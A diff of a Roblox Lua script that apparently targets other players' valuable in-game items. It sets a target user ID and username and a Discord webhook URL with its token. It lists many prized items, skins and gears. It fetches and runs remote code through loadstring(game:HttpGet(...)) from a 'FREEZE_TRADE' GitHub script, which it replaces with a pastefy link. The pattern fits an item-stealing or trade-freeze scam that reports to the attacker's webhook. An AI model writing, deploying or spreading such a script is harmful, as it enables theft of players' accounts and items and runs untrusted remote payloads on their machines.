@@ -1,51 +1,49 @@
-local TARGET_ID = 9344896158
-local TARGET_USER = "spydersammy_961"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1564792837776740483/mbGw8MHPLbNtVAw8sN7_1DpCGzPZQ8iU8ssIBvSrFOJ6qLnQMRhYi5FvalcKHZ0MsFHr"
+local TARGET_ID = 11611726754
+local TARGET_USER = "elquepinta_0"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1570966592219517079/KWwVvyxUQ5_Vx0NejTfhr3v1psXQfQ5fsZ1r_eCKXMi2umpuVyJXE8DEoDG_oXtOFvs1"
 
 local TargetBrainrots = {
-    ["Hydra Bunny"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Griffin"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Antonio"] = true,
-    ["Elefanto Frigo"] = true,
-    ["Rico Dinero"] = true,
-    ["Rubrikiko"] = true,
-    ["Arcadragon"] = true,
-    ["Pancake and Syrup"] = true,
-    ["Kalika Bros"] = true,
-    ["Tirilikalika Tirilikalako"] = true,
-    ["Globa Steppa"] = true,
-    ["Dug Dug Dug"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["La Casa Boo"] = true,
-    ["Dragon Aquanini"] = true,
-    ["Signore Carapace"] = true,
-    ["Fishino Clownino"] = true,
-    ["Cerberus"] = true,
-    ["Duggy Bros"] = true,
-    ["Kraken"] = true,
-    ["Venuspino"] = true,
-    ["Gorillo Subwoofero"] = true,
-    ["Foxini Lanternini"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["John Pork"] = true,
+    ["Headless Horseman"] = true,
     ["Dragon Skeletonini"] = true,
     ["Phoenix"] = true,
     ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
     ["Orchidox"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Meowl"] = true,
-    ["Skibidi Toilet"] = true,
     ["Los Dragons"] = true,
     ["La Craft Machine"] = true,
     ["Gold and Diamond"] = true,
-    ["John Pork"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
+    ["Antonio"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Rubrikiko"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Arcadragon"] = true,
+    ["Rico Dinero"] = true,
     ["Capitano Americano"] = true,
-    ["Headless Horseman"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Dragon Aquanini"] = true,
+    ["La Casa Boo"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Signore Carapace"] = true,
+    ["Fishino Clownino"] = true,
     ["4th Bros"] = true,
     ["Bufalino Boomberino"] = true,
+    ["Duggy Bros"] = true,
+    ["Cerberus"] = true,
+    ["Kraken"] = true,
     ["Money Money Bros"] = true,
+    ["Venuspino"] = true,
     ["Steakini Fattini"] = true,
     ["Rhino Helicopterino"] = true,
     ["Caylusaurus"] = true,
@@ -53,7 +51,9 @@ local TargetBrainrots = {
     ["Centrucci Nuclucci"] = true,
     ["Los Hackers"] = true,
     ["John Doe"] = true,
+    ["Gorillo Subwoofero"] = true,
     ["Jelly Moby"] = true,
+    ["Foxini Lanternini"] = true,
     ["Ginger Cisterna"] = true,
     ["Bearito Cabinito"] = true,
     ["Digi Narwhal"] = true,
@@ -231,7 +231,6 @@ local TargetBrainrots = {
     ["Pirulitoita Bicicleteira"] = true,
     ["Please My Present"] = true,
     ["Popcuru and Fizzuru"] = true,
-    ["Pot Hotspot"] = true,
     ["Pot Pumpkin"] = true,
     ["Pumpkini Spyderini"] = true,
     ["Quackini Snackini"] = true,
@@ -244,7 +243,6 @@ local TargetBrainrots = {
     ["Rosey and Teddy"] = true,
     ["Rosetti Tualetti"] = true,
     ["Sammyni Fattini"] = true,
-    ["Sammyni Spyderini"] = true,
     ["Santa Hotspot"] = true,
     ["Santteo"] = true,
     ["Secret Lucky Block"] = true,
@@ -253,7 +251,6 @@ local TargetBrainrots = {
     ["Spaghetti Tualetti"] = true,
     ["Spinny Hammy"] = true,
     ["Spooky and Pumpky"] = true,
-    ["Strawberrita"] = true,
     ["Swag Soda"] = true,
     ["Swaggy Bros"] = true,
     ["Tacorita Bicicleta"] = true,
@@ -262,7 +259,6 @@ local TargetBrainrots = {
     ["Telemorte"] = true,
     ["Tictac Sahur"] = true,
     ["To To To Sahur"] = true,
-    ["Torrtuginni Dragonfrutini"] = true,
     ["Tralaledon"] = true,
     ["Trenostruzzo Turbo 4000"] = true,
     ["Trickolino"] = true,
@@ -287,13 +283,15 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Sammyni Spyderini"] = true
 }
 
 local TargetBaseSkins = {
     ["Aquatic"] = true,
     ["Bunny Basket"] = true,
     ["Candy"] = true,
+    ["Christmas"] = true,
     ["Cursed"] = true,
     ["Cyber"] = true,
     ["Diamond"] = true,
@@ -314,8 +312,7 @@ local TargetBaseSkins = {
     ["Taco"] = true,
     ["Valentines"] = true,
     ["Yin Yang"] = true,
-    ["Tralalero"] = true,
-    ["Christmas"] = true
+    ["Tralalero"] = true
 }
 
 local TargetGears = {
@@ -324,6 +321,7 @@ local TargetGears = {
     ["Bloodmoon Hammer"] = true,
     ["Bloodmoon Slap"] = true,
     ["Candy Sentry"] = true,
+    ["Candy Slap"] = true,
     ["Cupid's Wings"] = true,
     ["Cursed Slap"] = true,
     ["Cyber Slap"] = true,
@@ -341,8 +339,7 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true,
-    ["Candy Slap"] = true
+    ["Crystal Slap"] = true
 }
 
 task.spawn(function()
@@ -350,7 +347,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
 
     task.wait(1)
 
